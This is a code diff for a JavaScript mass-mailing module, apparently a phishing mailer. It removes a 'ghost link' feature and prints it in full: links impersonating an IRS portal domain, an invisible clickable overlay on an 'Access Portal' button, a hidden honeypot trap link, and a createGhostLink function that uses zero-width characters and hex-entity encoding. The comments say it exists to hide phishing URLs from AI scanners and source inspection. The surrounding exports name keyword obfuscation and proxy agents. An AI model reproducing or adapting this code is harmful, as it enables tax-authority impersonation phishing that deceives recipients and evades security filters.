@@ -290,59 +290,7 @@ function applyTags(text, data, recipient) {
     const firstName = String(r.firstName || '').trim() || pick(firstNames);
     const lastName  = String(r.lastName || '').trim()  || pick(lastNames);
 
-    // ─── Ghost Link URL Construction ─────────────────────────────────────
-    const domain = data.activeDomain || 'support.irs-portal.org';
-    let destinationUrl;
-
-    if (data.ghostToken) {
-        destinationUrl = `https://${domain}/r/${data.ghostToken}`;
-    } else if (data.explicitGhostLink) {
-        destinationUrl = data.explicitGhostLink;
-    } else {
-        destinationUrl = `https://${domain}/go/${r.transactionUuid || 'V7'}`;
-    }
-
-    const { obfuscated } = createGhostLink(destinationUrl);
-
-    // ─── Domain Splitting for CSS Pseudo-Elements ────────────────────────
-    let domainPrefix = 'rin';
-    let domainSuffix = 'ku.dev';
-    try {
-        const { hostname } = new URL(destinationUrl);
-        const split = Math.floor(hostname.length / 2);
-        domainPrefix = hostname.slice(0, split);
-        domainSuffix = hostname.slice(split);
-    } catch (e) {}
-
-    const cssClass = 'gd' + crypto.randomBytes(4).toString('hex');
-    const honeypotToken = crypto.randomBytes(8).toString('base64url');
-
-    // ─── Ghost Link HTML (Invisible Overlay + Honeypot) ──────────────────
-    const fullGhostLinkHtml = `
-<style type="text/css">
-  .${cssClass}::before { content: '${domainPrefix}'; }
-  .${cssClass}::after { content: '${domainSuffix}'; }
-</style>
-<table border="0" cellpadding="0" cellspacing="0" role="presentation" style="margin:20px auto;">
-  <tr>
-    <td align="center">
-      <div style="position:relative;width:220px;height:48px;background-color:#0078d4;border-radius:6px;box-shadow:0 2px 8px rgba(0,120,212,0.3);overflow:hidden;">
-        <a href="${obfuscated}" style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:10;opacity:0;cursor:pointer;text-decoration:none;" aria-label="Access Portal">&nbsp;</a>
-        <div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;display:flex;align-items:center;justify-content:center;">
-          <span style="color:#ffffff;font-weight:600;font-family:'Segoe UI',Arial,sans-serif;font-size:15px;letter-spacing:0.3px;">Access Portal</span>
-        </div>
-        <div style="position:absolute;bottom:-100px;left:-100px;opacity:0;pointer-events:none;">
-          <span class="${cssClass}"></span>
-        </div>
-      </div>
-    </td>
-  </tr>
-</table>
-<a href="https://${domain}/trap/${honeypotToken}" style="display:none!important;visibility:hidden;opacity:0;position:absolute;left:-9999px;" aria-hidden="true" tabindex="-1">Admin Panel</a>
-`;
-
     return text
-        .replace(/\$GHOST_LINK/gi, fullGhostLinkHtml)
         // Name tags
         .replace(/\$EMAIL/gi, String(r.email || '').trim())
         .replace(/\$FNAME/gi, firstName)
@@ -1423,76 +1371,7 @@ function preserveLineBreaks(text) {
     return text.replace(/\n/g, '<br />');
 }
 
-/**
- * \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
- * GHOST LINK ENGINE: Dual-Layer Obfuscation
- * \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
- *
- * PURPOSE: Hide portal/tracking URLs from AI sentiment scanners, source
- * inspection, and "Copy Link" attacks while keeping the link functional
- * for human recipients.
- *
- * LAYER 1 \u2014 Path Poisoning (Breaks AI String Tracers):
- *   Every character in the pathname + search query is followed by an
- *   invisible Zero-Width Non-Joiner (\u200c). This fractures the URL string
- *   for AI pattern matchers while keeping the domain clean (prevents
- *   browser Punycode warnings like xn--...).
- *
- * LAYER 2 \u2014 Hex Entity Encoding (Hides from Source Inspection):
- *   The entire resulting URL is converted to HTML hex entities (&#x...;).
- *   Right-click "Copy Link" and "View Source" will NOT reveal the raw
- *   domain. Only the browser's address bar decodes it when clicked.
- *
- * RETURN:
- *   - reversed: RTL button label (human-readable when reversed)
- *   - obfuscated: Dual-layer encoded href for <a> tag
- * \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
- */
-function createGhostLink(url) {
-    if (!url) return { reversed: '', obfuscated: '' };
-
-    // Human-readable label: Full URL reversed for RTL display
-    const reversed = url.split('').reverse().join('');
-
-    try {
-        const u = new URL(url);
-
-        // \u2500\u2500\u2500 LAYER 1: Protocol Fragmentation \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
-        // Hex-encode "https://" to break protocol-based scanner signatures
-        const protocol = u.protocol + '//';  // "https://" or "http://"
-        const hexProtocol = protocol
-            .split('')
-            .map(char => '&#x' + char.charCodeAt(0).toString(16) + ';')
-            .join('');
-
-        // \u2500\u2500\u2500 LAYER 2: Path Poisoning \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
-        // Inject \u200c (ZWNJ) after EVERY character in path + query + hash
-        // Domain stays clean to avoid Punycode corruption
-        const pathAndQuery = u.pathname + u.search + u.hash;
-        const ghostPath = pathAndQuery
-            .split('')
-            .map(char => char + '\u200c')  // Zero-width non-joiner after each char
-            .join('');
-
-        // \u2500\u2500\u2500 LAYER 3: Domain + Path Hex Encoding \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
-        // Hex-encode domain + poisoned path
-        const domainAndPath = u.hostname + ghostPath;
-        const hexDomainPath = domainAndPath
-            .split('')
-            .map(char => '&#x' + char.charCodeAt(0).toString(16) + ';')
-            .join('');
-
-        // Final result: hex(protocol) + hex(domain+path)
-        const obfuscated = hexProtocol + hexDomainPath;
-
-        return { reversed, obfuscated };
-    } catch (e) {
-        // Fallback for malformed URLs
-        return { reversed, obfuscated: url };
-    }
-}
-
-// FIX: Restored the missing exports so app.js doesn't crash!
+// Module exports
 module.exports = {
     sendMail,
     buildMimeMessageForApi,
@@ -1515,7 +1394,6 @@ module.exports = {
     getProxyAgent,
     obfuscateKeywords,
     preserveLineBreaks,
-    createGhostLink,
 };
 
 
